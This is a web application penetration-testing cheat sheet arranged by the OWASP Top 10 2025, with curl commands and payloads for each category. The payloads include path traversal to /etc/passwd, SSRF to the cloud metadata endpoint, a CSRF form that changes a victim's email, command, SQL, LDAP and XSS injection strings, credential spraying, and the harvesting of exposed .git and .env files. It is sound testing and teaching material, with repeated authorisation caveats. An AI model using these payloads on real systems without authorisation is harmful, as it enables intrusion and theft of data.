# OWASP Top 10, 2025

Written against the current OWASP Top 10 list. Each category below is ordered
the same way so you can work through an application systematically: what it
is, how to find it, what to send, how to prove it, and how to report it.

Two conventions used throughout:

- **In the browser** means the GUI path, using DevTools or a proxy. This is not
  a lesser way of working. For access control, business logic, and client-side
  bugs it is the *better* way, because you are testing what a user actually gets.
- Payloads are minimal proof only. If a boolean difference proves it, stop there.

Test only systems you own or have written authorisation to test.

---

## What changed in 2025, and why it matters

If you learned the 2021 list, three things will surprise you.

| Change | Detail |
|---|---|
| **SSRF is no longer its own category** | CWE-918 was folded into A01 Broken Access Control. Do not report SSRF as a Top 10 item any more |
| **A03 is new** | "Software Supply Chain Failures" replaces 2021's "Vulnerable and Outdated Components" and is much broader: dependencies, build systems, distribution |
| **A10 is new** | "Mishandling of Exceptional Conditions" — error handling, failing open, swallowed exceptions |
| Reordering | Security Misconfiguration #5 to **#2**. Injection #3 to #5. Crypto #2 to #4 |

A04 Cryptographic Failures also absorbed several 2021 items that had been listed
separately. The categories are less granular than in 2021, so a single category
can cover a lot of ground. Read the mapped CWEs when you want the detail.

---

## A01:2025 Broken Access Control

Number one every year, and the category most likely to be present in an
application you are assessing right now. It also now contains SSRF, CSRF, path
traversal, and open redirect, because they are all really the same mistake:
the server trusting the client's claim about what it is allowed to do.

**The core idea.** The application checks that you are *logged in*, then never
checks that *this specific thing* belongs to you.

**OWASP's own figures for A01, so you can put them in a report.** 100% of the
applications in their contributed data set had some form of broken access
control. It maps to 40 CWEs, with a 3.74% average incidence rate, and accounts
for 1,839,701 occurrences and 32,654 CVEs — the highest occurrence count and
second-highest CVE count in the list. When you scope a web engagement, this is
the category to budget time for.

### A01.1 IDOR and BOLA

The highest-yield web finding there is, and it needs no payload at all.

```bash
# Find candidate parameters
grep -rohE "[a-zA-Z_]+\.(php|aspx|jsp)[^ \"']*\?[a-zA-Z_]+=" urls.txt | sort -u
grep -rohE "/(api|user|account|order|invoice|profile|document|file)/[0-9]+" urls.txt | sort -u
```

```bash
# Compare your own record with someone else's
curl -s "https://<target>/api/v1/invoices/1041" -H "Authorization: Bearer <token>" | jq .
curl -s "https://<target>/api/v1/invoices/1042" -H "Authorization: Bearer <token>" | jq .
# Same token, different ID, different data = BOLA
```

```bash
# Enumerate small integers
for id in $(seq 1 500); do
  c=$(curl -s -o /dev/null -w "%{http_code}" "https://<target>/api/users/$id" -H "Authorization: Bearer $TOKEN")
  [ "$c" = "200" ] && echo "200 $id"
done
```

**In the browser.** This is one you should genuinely do by hand. Register two
accounts, log into both in separate browser profiles or a private window. In
DevTools, open the Network tab, filter by `fetch`/`xhr`, click a request that
returns your own data, and read the URL. Note the identifier. Now open the other
account, open the same page, and edit the identifier in the request. You are
now reading someone else's data with your own session, and you did it all in the
browser.

### A01.2 Missing function-level access control

The UI hides an admin button. The endpoint behind it does not check.

```bash
# Find admin endpoints
grep -rohE "/(admin|manage|internal|api/v2|debug|config)[a-zA-Z0-9/_-]*" urls.txt | sort -u
# Call them directly with an ordinary account
curl -s -o /dev/null -w "%{http_code}\n" https://<target>/admin/users
curl -s -o /dev/null -w "%{http_code}\n" https://<target>/api/v2/internal/config
```

**In the browser.** Right-click a button in the UI. If it is a real link, the
URL is right there. If it is a JavaScript handler, DevTools Console lets you
call the function directly, and the Network tab shows what it calls. Admin
functions that are invisible in the UI are frequently not protected at all.

### A01.3 Path traversal

```bash
# Linux
curl -s "https://<target>/?file=../../../../etc/passwd"
curl -s "https://<target>/?file=....//....//....//etc/passwd"
curl -s "https://<target>/?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
curl -s "https://<target>/?file=..%252f..%252f..%252fetc%252fpasswd"

# Windows
curl -s "https://<target>/?file=..\..\..\..\windows\win.ini"
```

```bash
# PHP source disclosure. The single most useful trick against a PHP app.
curl -s "https://<target>/?page=php://filter/convert.base64-encode/resource=index"
```

### A01.4 SSRF, now part of A01

```bash
# Prove it with a callback rather than by reading internal data
curl "https://<target>/fetch?url=http://<oast-id>.oast.live/"
```

```bash
# Parser bypasses
file:///etc/passwd
http://127.0.0.1/
http://0177.0.0.1/              # octal
http://2130706433/              # decimal
http://[::1]/
http://169.254.169.254/latest/meta-data/    # cloud metadata
gopher://127.0.0.1:6379/_INFO
```

### A01.5 CSRF

Now inside A01 because it is the same root cause.

```bash
# The HTML a victim would need to load
<html><body>
<form action="https://<target>/account/email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.example">
</form>
<script>document.forms[0].submit()</script>
</body></html>
```

**Verify it properly.** CSRF needs three conditions: the state-changing request,
no unpredictable token, and a SameSite cookie policy that does not block it.
Test all three, because "there is no CSRF token but the cookie is SameSite=Strict
so it does not work" is a different finding from "no token and it works".

### A01.6 Open redirect

```bash
curl -s -o /dev/null -w "%{http_code} -> %{redirect_url}\n" \
  "https://<target>/login?next=https://evil.example"
```

**Prove it with a real, harmless domain you own**, and screenshot the redirect.
Reporting an open redirect to a target you have not verified can be dismissed
as a misconfiguration.

### Reporting A01

Report the **path**, not the observation. "The `/api/v1/invoices/{id}` endpoint
returns any user's invoices to any authenticated user" is a finding. "We were
able to access invoices" is not.

---

## A02:2025 Security Misconfiguration

Jumped from #5 to #2, and it is the easiest category to find and the easiest to
prove. It is also the one most likely to be a real incident rather than a bug.

```bash
# Always, on every target, before anything else
curl -s https://<target>/robots.txt
curl -s https://<target>/.git/HEAD
curl -s https://<target>/.env
curl -s https://<target>/.DS_Store
curl -s https://<target>/.well-known/security.txt
curl -sI https://<target/
curl -s -X OPTIONS -I https://<target>/          # allowed methods
```

```bash
# Exposed git. The whole source tree, including history.
curl -s https://<target>/.git/HEAD
curl -s https://<target>/.git/config
git clone https://<target>/.git repo && cd repo
git log --all --oneline
# Then look for secrets in the history, not just the tip
```

```bash
# Framework and infrastructure defaults
curl -s https://<target>/server-status          # Apache
curl -s https://<target>/phpinfo.php
curl -s https://<target>/actuator/env           # Spring Boot. Frequently severe
curl -s https://<target>/actuator/heapdump
curl -s https://<target>/debug/vars             # Go
curl -s https://<target>/elmah.axd              # .NET error log
curl -s https://<target>/WEB-INF/web.xml        # Java
curl -s https://<target>/config/database.yml    # Rails
```

```bash
# Default and weak credentials on exposed services
curl -s -o /dev/null -w "%{http_code}\n" https://<target>/admin
netexec smb <target> -u admin -p admin --shares
```

```bash
# Scanning for it
nikto -h https://<target> -C all
nuclei -l hosts.txt -tags exposure,misconfig -severity medium,high,critical
```

**In the browser.** Read the response headers. Check whether a directory
listing is on. Look at the login page for a version string, a framework logo, or
a forgotten debug toolbar. Check whether the error page leaks a stack trace, and
whether verbose errors differ between a validation failure and a missing record,
which tells you an attacker can enumerate users.

### Reporting A02

Severity follows consequence, not category. "Debug mode enabled" is low. "Spring
Boot actuator exposing `/env` with database and cloud credentials" is critical.
Name the specific exposure and what it grants.

---

## A03:2025 Software Supply Chain Failures

New for 2025, and the broadest one on the list. It covers compromise of anything
you depend on, not just the libraries in your app.

Four distinct sub-problems, and they need different testing:

### A03.1 Vulnerable dependencies

```bash
# What is actually being used
cat package.json package-lock.json          # Node
cat requirements.txt Pipfile.lock poetry.lock # Python
cat pom.xml                                  # Java
cat go.mod go.sum                            # Go
cat Gemfile.lock                             # Ruby
cat composer.lock                            # PHP
cat Cargo.lock                               # Rust
```

```bash
# Find known CVEs. Do not report "package X is old" as a finding.
npm audit
pip-audit
trivy fs --scanners vuln .
snyk test
osv-scanner --lockfile=package-lock.json
# Map a version to public exploits
searchsploit <software> <version>
```

```bash
# Client-side, which is the part most people forget
# A vulnerable library in the front end is delivered to every user
# Extract versions from the shipped JavaScript
cat app.js | grep -oE "[a-z@/-]+@[0-9]+\.[0-9]+\.[0-9]+" | sort -u
# retire.js, and the outdated-requests check in Burp
```

### A03.2 CI/CD compromise

The one that matters most in practice. A pipeline often holds credentials with
broader access than the application does.

```bash
# Look for pipeline definitions and exposed build artifacts
curl -s https://<target>/.gitlab-ci.yml
curl -s https://<target>/.github/workflows/ -o /dev/null -w "%{http_code}\n"
curl -s https://<target>/Jenkins/
curl -s https://<target>/.travis.yml
```

```bash
# A public repository is the finding, and it is common
# Read the history, not just the current tree
trufflehog git file://.
gitleaks detect --source . --log-opts="--all"
git log -p --all | grep -iE "password|secret|api[_-]?key|token|credential"
```

**In the browser.** Open the app, then look at what the front end is served
from. A CDN-hosted bundle with a source map published is a supply chain problem
in the making, because anyone can read the source and the dependencies.

### A03.3 Untrusted distribution

```bash
# Package registry confusion and typosquatting
pip install <package> --no-cache-dir -v 2>&1 | head -20
npm view <package> repository.url
# Unsigned artefacts. A binary you cannot verify is a binary you cannot trust.
gpg --verify artefact.sig
shasum -a 256 -c artefact.sha256
```

### A03.4 CI artefact and build log exposure

```bash
# Build logs frequently contain the secrets the build used
curl -s https://<target>/build-log
curl -s https://<target>/artifacts/
```

### Reporting A03

Never report "uses an outdated library". Report the **specific CVE, its
severity, and whether it is reachable in this application**. An unused
vulnerable function in a dependency is a supply chain risk to report
separately from a reachable one, and conflating them destroys credibility.

---

## A04:2025 Cryptographic Failures

Moved down to #4, but it produces the most expensive findings when it lands.

```bash
# Is it even encrypted
curl -sv https://<target>/ 2>&1 | grep -iE "HTTP/|location:|set-cookie|Strict-Transport"
# http:// on a login page, or a redirect from https to http, is a finding
```

```bash
# TLS configuration
testssl.sh https://<target>
sslscan --show-certificate https://<target>
gobuster dns -d <target> -w /usr/share/seclists/Discovery/DNS/namelist.txt -t 50
# Look for: TLS 1.0/1.1, weak ciphers, missing HSTS, expired or
# self-signed certificates, and certificate transparency surprises
```

```bash
# Weak or broken hashing, in the places it turns up
# Source:  user_password_hash
# Database: SELECT * FROM users;    look at the hash format
# Identify the algorithm from the prefix
"$1$"      MD5      500
"$2a$"     bcrypt    3200
"$5$"      SHA-256   7400
"$6$"      SHA-512   1800
```

```bash
# Sensitive data in transit or at rest, exposed
curl -s https://<target>/api/v1/users/1 | jq keys
grep -rniE "BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY" . --include="*.pem" --include="*.key"
```

**In the browser.** Open DevTools, Application tab, then Cookies and
Local Storage. Look for session tokens, auth flags, personal data. Then
Security tab for the TLS summary. Then check whether the login form posts over
HTTPS and whether the password field is a real `type="password"`.

### Reporting A04

Name the data and the consequence. "Weak hashing" is abstract. "User passwords
are stored as unsalted MD5; an attacker with a copy of the database recovers
most passwords in minutes and the same passwords will be reused on other
services" is a finding that gets funded.

---

## A05:2025 Injection

Down to #5 by ranking, still first by finding frequency. Injection covers SQL,
command, LDAP, XPath, XSS, template, and header injection. Detailed per-class
material is in [web-testing.md](web-testing.md); this is the index.

### Injection reference

| Class | Detection | Proof payload | Sheet |
|---|---|---|---|
| SQL | `'`, boolean pair, sleep | `' AND SLEEP(5)-- -` | [web-testing](web-testing.md#sql-injection) |
| Command | `;` `\|` `&&` `$( )` | `;id` | [rce](rce.md) |
| XSS | reflected marker | `<svg/onload=alert(1)>` | [web-testing](web-testing.md#cross-site-scripting) |
| SSTI | math evaluation | `{{7*7}}` | [web-testing](web-testing.md#ssti) |
| LDAP | wildcard and filter | `*)(uid=*))(|(uid=*` | below |
| XPath | node extraction | `1' or '1'='1` | below |
| Header | newline in a header | `%0d%0aInjected: x` | below |
| Log | newline in a logged field | `%0aINJECTED` | below |
| CRLF | header splitting | `%0d%0a` | below |
| Expression | OGNL, SpEL | `${7*7}` | below |

```bash
# LDAP injection, common in login forms and LDAP-backed search
username=*)(uid=*))(|(uid=*
username=admin)(|(password=*
```

```bash
# XPath injection
' or '1'='1
' or ''='
count(//*[contains(., 'admin')])
```

```bash
# Command injection detection
;id
|id
&&id
$(id)
`id`
%0aid          # newline separated
```

```bash
# CRLF, header splitting
curl -sI "https://<target>/?q=test%0d%0aX-Injected:%20yes"
```

### Where the payloads go, systematically

The mistake is testing one parameter thoroughly. Test **every** input, in this
order, and keep a note of which ones reach a sink:

1. Query string parameters
2. Form fields, including hidden ones
3. JSON and XML request bodies
4. Headers, especially `User-Agent`, `Referer`, `X-Forwarded-For`, custom ones
5. Cookies
6. File uploads, including the filename and the content type
7. Path segments, `/users/<here>/edit`
8. Websocket message payloads
9. Search, sort, and filter parameters, which are the most commonly forgotten

**In the browser.** DevTools Network tab, click a request, and edit it in place.
This is faster than curl for finding which parameter reaches a sink, and the
"Edit and Resend" button means you do not need a proxy for the first pass. The
Initiator tab tells you which JavaScript function built the request, which is
how you find the parameter that the UI does not expose.

### Reporting A05

Prove with the smallest possible artifact: a boolean pair, a five-second delay,
or an error message. A dump of the database is not evidence of a vulnerability,
it is evidence of a breach. If you did retrieve data, redact it and say so.

---

## A06:2025 Insecure Design

The one category that no scanner can find, because it is an absence rather than
a bug. It is a design flaw in the business logic.

**Questions that find it:**

- What can a user do that they should not, in the normal flow?
- Is there a limit, and can it be bypassed by changing the request?
- Is a sensitive action confirmed by something the user knows, or only by a
  session?
- Can the sequence of steps be reordered, skipped, or repeated?
- What is the maximum impact of one user's mistake?
- Is there a rate limit, and is it per user, per account, or per IP?

```bash
# Business logic probing, done by changing one field at a time
curl -s -X POST https://<target>/api/checkout \
  -H "Content-Type: application/json" -b "session=$COOKIE" \
  -d '{"item":1,"price":0.01,"qty":-5}'

# Race condition, two identical requests sent simultaneously
for i in 1 2; do curl -s -X POST https://<target>/api/apply-coupon -b "session=$COOKIE" -d '{"code":"SAVE20"}' & done; wait
```

**In the browser.** Walk the application as a user would, and write down what
each step is *supposed* to guarantee. Then do something slightly out of order.
The gap between the two is the finding.

### Reporting A06

Report the missing control and the business consequence, not a theoretical
abuse case. "No rate limit on the password reset endpoint" is a finding. "An
attacker could enumerate valid email addresses" is the impact. "The discount
endpoint does not verify the caller owns the cart" is better still, because it
names the exact missing check.

---

## A07:2025 Authentication Failures

Renamed from "Identification and Authentication Failures". The substance is the
same and it is very testable.

```bash
# Login endpoint, and how it behaves
curl -sv https://<target>/login -c cookies.txt
# Enumeration: different message, different timing, or a different status code
curl -s -o /dev/null -w "%{time_total}\n" -X POST https://<target>/login -d '{"user":"real@example.com","pass":"wrong"}'
curl -s -o /dev/null -w "%{time_total}\n" -X POST https://<target>/login -d '{"user":"nobody@example.com","pass":"wrong"}'
```

```bash
# Credential stuffing is a real test only with permission.
# Otherwise, a light spray against your own accounts.
netexec smb <target> -u users.txt -p 'Password1!' --no-bruteforce
```

```bash
# Session handling
# Does the identifier rotate on login and on privilege change?
# Does logging out invalidate it?
curl -s -X POST https://<target>/logout -b "session=$COOKIE" -c cookies2.txt
curl -s https://<target>/dashboard -b "session=$COOKIE"   # still valid = finding
```

**The full checklist that finds real issues:**

- [ ] Password reset token is long, random, single-use, and time limited
- [ ] Password reset does not reveal whether an account exists
- [ ] No user enumeration in messages, status codes, or timing
- [ ] Session ID rotates on login, on logout, and on password change
- [ ] Old sessions are invalidated when a password is changed
- [ ] Cookies set `HttpOnly`, `Secure`, and an appropriate `SameSite`
- [ ] Session timeout configured
- [ ] No MFA bypass on a secondary path, such as an API or a mobile endpoint
- [ ] MFA cannot be disabled without a password
- [ ] Backup codes are single-use and revocable
- [ ] No default or vendor credentials
- [ ] Password policy is enforced, and the policy is actually a good one
- [ ] Rate limiting and lockout exist, and are reasonable
- [ ] Recovery flows are as strong as the primary flow

**In the browser.** Log in, log out, log in as someone else. Then in DevTools,
Application tab, look at what the cookie actually is. Then set the session cookie
to a value you invent and see whether the server accepts it, which is the
classic session-fixation test.

### Reporting A07

Do not report "I logged in with a default password" without also reporting which
service and whether it is exposed. And do not report account lockout as
vulnerability when the client asked you not to test it.

---

## A08:2025 Software or Data Integrity Failures

Focuses on failing to verify integrity below the supply chain level. It is
CWE-502 territory, and the practical instances are deserialisation, unsigned
updates, and insecure CI.

```bash
# Deserialisation is the headline item. Identify the format from the payload.
# Java:     base64 starting rO0AB, or hex AC ED 00 05
# .NET:     __VIEWSTATE, BinaryFormatter
# PHP:      O:8:"stdClass" style strings
# Python:   gASV base64
echo "rO0AB..." | base64 -d | xxd | head
```

```bash
# Unsigned updates
curl -sI https://<target>/update/latest | grep -iE "content-type|digest"
# A binary or plugin delivered over HTTP with no signature is a finding
```

```bash
# Insecure CI
# Untrusted input reaching a build script, or a pipeline that can be triggered
# by anyone who can open a pull request
curl -s https://<target>/.github/workflows/ -o /dev/null -w "%{http_code}\n"
```

### Reporting A08

For deserialisation, identify the library and version before you build anything.
A gadget chain for the wrong version simply fails, and chasing that wastes
hours. Prove you can trigger the deserialiser with a harmless side effect, and
stop there.

---

## A09:2025 Security Logging and Alerting Failures

Renamed from "Monitoring" to emphasize that logging without alerting is close
to worthless. The hard part is that absence of evidence is difficult to prove.

**What to check:**

```bash
# Does a failed login get recorded anywhere you can see?
# Log in incorrectly 5 times, then look at the client-visible behaviour
# Is there a lockout notification, an email, a visible log?
```

- [ ] Failed logins are logged with source IP and timestamp
- [ ] Successful logins to unusual locations are logged and alerted on
- [ ] Privilege changes are logged
- [ ] Access to sensitive records is logged
- [ ] Logins from new devices or new geographies are alerted
- [ ] Bulk data access is detected and alerted on
- [ ] The logs are not writable by the application user
- [ ] The logs go somewhere the application cannot tamper with
- [ ] Something alerts on the above, and somebody reads it
- [ ] Audit logs are not disabled by an ordinary user

**In the browser.** Try to find a UI feature that reveals whether an action was
logged. Change your email address, then check whether the activity feed shows
it. Applications that log correctly often expose an account activity page, and
if it exists you can use it as evidence for the rest of your testing.

### Reporting A09

This category is where you are most likely to overclaim. Do not report "the
application did not block my brute force attempt" as a logging failure. Report
what you can demonstrate: "no lockout, no alert, and no log entry was produced
after 500 failed login attempts against an account I created." Keep the claim
narrow and factual.

---

## A10:2025 Mishandling of Exceptional Conditions

New for 2025, and the one nobody tests, so you will often be first to report it.
It covers improper error handling, failing open, and swallowed exceptions.

```bash
# Verbose errors leaking internals
curl -s "https://<target>/?id=1'" | grep -iE "stack trace|SQLException|ORA-|Traceback|\.java|\.py"
curl -s "https://<target>/nonexistent-page-12345"
```

```bash
# Distinguishing errors reveals state
# Different response for "user exists" versus "user does not exist"
curl -s -X POST https://<target>/login -d '{"user":"real","pass":"wrong"}' | head -20
curl -s -X POST https://<target>/login -d '{"user":"fake","pass":"wrong"}' | head -20
```

**The real problem is failing open**, and it is the highest impact version:

- An authentication check that returns true on an exception
- A payment step that proceeds when the gateway call fails
- An authorisation check that fails open when the session service is unavailable
- A file upload that proceeds when the virus scanner is not reachable
- A rate limiter that disables itself when the backing store errors
- A workflow that approves when an approval service returns nothing

```bash
# To test properly you need to break a dependency, which is invasive.
# Do it in an authorised environment, and ask first.
# Practical approach: find a parameter that reaches an error path
curl -s "https://<target>/api/profile" -H "Content-Type: application/json" -d '{invalid json'
curl -s -X POST https://<target>/api/checkout -H "Content-Type: application/json" -d '{"qty":"not-a-number"}'
```

### Reporting A10

Frame it as a reliability and security problem, and be specific about the
consequence of failing open. "Stack trace discloses the framework version and
the SQL query" is low. "The payment endpoint proceeds to order confirmation when
the payment gateway returns a 500 rather than a decline, so an attacker who can
interrupt the outbound request completes purchases without paying" is critical,
and it is a real class of bug in payment systems.

---

## A working order

If you have not tested an application before, this is the sequence that finds
the most in the least time.

1. **Browse it properly.** Every page, every link, every form. Read the source.
   Note every parameter. Do this before any tool touches it.
2. **A01** Access control. Two accounts, then walk the object IDs. Highest
   yield, lowest effort, no payloads.
3. **A02** Misconfiguration. robots.txt, `.git`, `.env`, headers, actuator.
   Minutes of work, frequently critical.
4. **A07** Authentication. Read the reset flow, check session handling, check
   enumeration.
5. **A05** Injection. Every input, small payloads, proof only.
6. **A04** Crypto and **A08** integrity. Headers, TLS, dependencies.
7. **A06** Design and **A10** exceptions. Business logic and error paths.
8. **A03** Supply chain. Dependencies, CI, repository history.
9. **A09** Logging. What got recorded while you did all of the above.

The reason this order works is that A01 and A02 require no payload crafting and
frequently find critical issues, so you are not spending your credibility
budget early on hard-to-prove low-severity findings.

---

## References

The category names, the mapped CWEs, and the figures quoted in A01 are taken
from the official pages, not from memory. Check them when you cite this sheet,
because the list will change again.

- [OWASP Top 10:2025](https://owasp.org/Top10/2025/) — the list itself
- [A01 Broken Access Control](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/) — incidence figures and the 40 mapped CWEs
- [Introduction to the 2025 release](https://owasp.org/Top10/2025/0x00_2025-Introduction/) — what moved and why
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) — the full testing methodology, free, and the best single reference in this field
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/) — the remediation advice per category
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — free, hands-on, and the best place to actually practise the payloads in this sheet
- [OWASP Cheat Sheet for Penetration Testing](https://cheatsheetseries.owasp.org/cheatsheets/Penetration_Testing_Cheat_Sheet.html) — the reporting and process side
